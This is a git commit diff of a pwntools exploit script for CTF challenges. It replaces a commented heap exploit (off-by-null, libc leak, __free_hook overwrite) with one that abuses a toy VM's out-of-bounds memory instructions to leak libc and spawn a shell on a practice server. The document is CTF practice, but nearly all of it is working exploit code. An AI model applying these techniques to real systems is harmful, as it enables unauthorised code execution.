bc8ac2a133e7d566f4b22c6bb16a3a6c79d548ce
Haobin Chen <etyyuiope@qq.com>
2022-12-02 22:08:18 -0500

    Fix error script

--- ogeek2019_final_ovm.py
+++ ogeek2019_final_ovm.py
@@ -1,123 +1,96 @@
 from pwn import *
 from LibcSearcher import *
 
-import utils
-
-context.arch = 'amd64'
-context.log_level = 'debug'
-
-target = remote('node4.buuoj.cn', 26207)
-libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-amd64/libc-2.23.so')
-elf = ELF('../b00ks')
-# target = process('../b00ks')
-
-
-def create(bookname_size, bookname, desc_size, desc):
-    target.sendlineafter('> ', '1')
-    target.sendlineafter(': ', str(bookname_size))
-    target.sendlineafter(': ', bookname)
-    target.sendlineafter(': ', str(desc_size))
-    target.sendlineafter(': ', desc)
-
-
-def delete(index):
-    target.sendlineafter('> ', '2')
-    target.sendlineafter('delete: ', str(index))
-
-
-def edit(index, desc):
-    # We can only send limited bytes of new description to the booklist because
-    # it will keep track of the allocated size.
-    target.sendlineafter('> ', '3')
-    target.sendlineafter(': ', str(index))
-    target.sendlineafter(': ', desc)
-
-
-def printf():
-    target.sendlineafter('> ', '4')
-
-
-def change_author(author):
-    target.sendlineafter('> ', '5')
-    target.sendlineafter(': ', author)
-
+target = remote('node4.buuoj.cn', 25476)
+libc = ELF('libc-2.23.so')
 
 '''
-Roadmap:
-  1. Since the address of author_name is adjacent to that of the heap array of books, we can use the off-by-null bug to replace the last byte of the first heap array and let it point to the nearest address ends with 00.
-  2. Also note that when we first write 32 bytes to author_name, it will append an \x00 to indicate that the string ends there. However, allocating book 1 will replace the last \x00. So when we print author_name, the address of book1 will be leaked.
-  3. So we can construct a fake book that resides in book1' description.
-  4. How do we control the fake book? Yes, we can replace the last byte of book1's address, and let it point to its description field (The size of bookname and description can be determined by gdb debugger).
+Opcode and instruction lookup table:
+
+mov reg, src2		 	      0x10 : reg[dst] = src2
+mov reg, 0				      0x20 : reg[dst] = 0
+ldr [mem], reg          0x30 : reg[dst] = memory[reg[src2]]
+str reg, [mem]          0x40 : memory[reg[src2]] = reg[dst]
+push reg                0x50 : stack[result] = reg[dst]
+pop reg                 0x60 : reg[dst] = stack[reg[13]]
+add                     0x70 : reg[dst] = reg[src2] + reg[src1]
+sub                     0x80 : reg[dst] = reg[src1] - reg[src2]
+and                     0x90 : reg[dst] = reg[src2] & reg[src1]
+or                      0xA0 : reg[dst] = reg[src2] | reg[src1]
+xor          	        	0xB0 : reg[dst] = reg[src2] ^ reg[src1]
+shl                     0xC0 : reg[dst] = reg[src1] << reg[src2]
+shr                     0xD0 : reg[dst] = reg[src1] >> reg[src2]
+                        0xFF : (exit or print) if(reg[13] != 0) print oper else exit?
+
 '''
 
-# The content of heap_ptr is 0x202060, and that of author str is 0x202040.
-# Maybe we can use author_str to modify a byte of heap_ptr's last byte?
+def create_inst(opcode, v4, v3, v2):
+    res = opcode << 24
+    res |= v4 << 16
+    res |= v3 << 8
+    res |= v2
 
-# The function at offset 9F3 will append an extra 0 byte to the input string
-# which causes the off-by-null bug.
-
-# Since the program is fully RELRO-ed, we can only modify hook pointer.
-# To do so, we must leak the base address of libc.
-
-# Malloc order: bookname -> bookdesc -> book
-# If we use author_name to modify the last byte of book 0, then it
-# will point to bookname, given that we carefully allocated the memory.
-
-# Author name.
-target.sendlineafter('name: ', b'a' * 0x20)
-
-# By mallocting as follows, we make sure that the last byte of bookdesc's
-# memory address is 0.
-create(0x60, 'aaaa', 0x90, 'bbbb')
-# So the last byte of author_name will be overwritten by book 0's address.
-# Then we could leak the address of book 0 because the 0 byte is now replaced
-# by newly allocated book0 address' last byte!
-printf()
-target.recvuntil(b'a' * 0x20)
-book1_addr = u64(target.recv(6).ljust(8, b'\x00'))
-print(hex(book1_addr))
+    return str(res)
 
 
-create(0x21000, '/bin/sh\x00', 0x21000, '/bin/sh\x00')
-# We construct a fake book struct within book 1.
-# The fake book uses the description and name fields of book 2.
-# 'a' 0xb0 is for padding. Calculated by gdb. :)
-book2_name = book1_addr + 0x38
-book2_desc = book1_addr + 0x40
-payload = b'a' * 0x70 + p64(0x1) + p64(book2_name) + \
-          p64(book2_desc) + p64(0xffff)
-edit(1, payload)
+target.sendlineafter('PCPC: ', b'0')
+target.sendlineafter('SP: ', b'1')
+target.sendlineafter('CODE SIZE: ', b'19')
+target.recvuntil('CODE: ')
 
-change_author(b'a' * 0x20)
-# Now book0_ptr points to book0's description field => Our fake book!
-# We can thus leak all the information about book 2 because the description
-# field is now interpreted as a new book struct.
-# So print book 0 will leak book 1's descirption / name address.
-printf()
+# Send code.
+# __free_hook - stderr_ptr - 0x8 = 0x10a0
 
-target.recvuntil('Name: ')
-book2_name_addr = u64(target.recv(6).ljust(8, b'\x00'))
-target.recvuntil('Description: ')
-book2_desc_addr = u64(target.recv(6).ljust(8, b'\x00'))
-print(hex(book2_name_addr), hex(book2_desc_addr))
+# reg[0] = 26
+target.sendline(create_inst(0x10, 0, 0, 26))
+# reg[1] = reg[1] - reg[0]
+target.sendline(create_inst(0x80, 1, 1, 0))
+# ldr reg[0], [reg[1]]
+target.sendline(create_inst(0x30, 0, 0, 1))
+# reg[1] = 25
+target.sendline(create_inst(0x10, 1, 0, 25))
+# reg[2] = reg[2] - reg[1]
+target.sendline(create_inst(0x80, 2, 2, 1))
+# ldr reg[1], [reg[2]]
+target.sendline(create_inst(0x30, 1, 0, 2))
+# Now reg[1] -> higher 32 bits; reg[0] -> lower 32 bits.
+# reg[3] = 0xa0
+target.sendline(create_inst(0x10, 3, 0, 0xa0))
+# reg[4] = 1, reg[5] = 12
+target.sendline(create_inst(0x10, 4, 0, 1))
+target.sendline(create_inst(0x10, 5, 0, 12))
+# reg[4] <<= 12
+target.sendline(create_inst(0xc0, 4, 4, 5))
+# reg[3] = reg[3] + reg[4] => 0x10a0
+target.sendline(create_inst(0x70, 3, 3, 4))
+# reg[3] = reg[3] + reg[0] => stderr + offset => __free_hook - 8.
+target.sendline(create_inst(0x70, 3, 3, 0))
 
-# The offset from book 2's name / description from libc base is fixed.
-libc_base = book2_name_addr - 0x5ca010
-print('[+] libc base: {}'.format(hex(libc_base)))
+# # Leak __free_hook - 8.
+# reg[5] = 8
+target.sendline(create_inst(0x10, 5, 0, 8))
+target.sendline(create_inst(0x80, 6, 6, 5))
+# str [reg[6]], reg[3] ; free_hook - 8 lower
+target.sendline(create_inst(0x40, 3, 0, 6))
+# reg[7] = 7
+target.sendline(create_inst(0x10, 7, 0, 7))
+target.sendline(create_inst(0x80, 8, 8, 7))
+# str [reg[8]], reg[1] ; free_hook - 8 higher
+target.sendline(create_inst(0x40, 1, 0, 8))
 
-system = libc.symbols["system"] + libc_base
-free_hook = libc.symbols['__free_hook'] + libc_base
+# Print regs.
+target.sendline(create_inst(0xff, 0, 0, 0))
 
-# We have now make book1 points to its description, so if we modify it, we are
-# modifying the fake book within its description field. Thus, we write free_hook
-# on book2's description (because the fake book's description field points to
-# there).
-payload = p64(free_hook) + b'\x00\x00' + b'\x20'
-edit(1, payload)
-payload = p64(system)
-edit(2, payload)
+# Get __free_hook - 8.
+target.recvuntil('R1: ')
+higher = int(target.recv(4), 16)
+target.recvuntil('R3: ')
+lower  = int(target.recv(8), 16)
+free_hook = higher * (2 ** 32) + lower + 8
+print('[+] __free_hook addr:', hex(free_hook))
 
-delete(2)
+base = free_hook - libc.sym['__free_hook']
+system = libc.sym['system'] + base
+target.sendline(b'/bin/sh\x00' + p64(system))
 
 target.interactive()
-# target.sendline('cat flag')
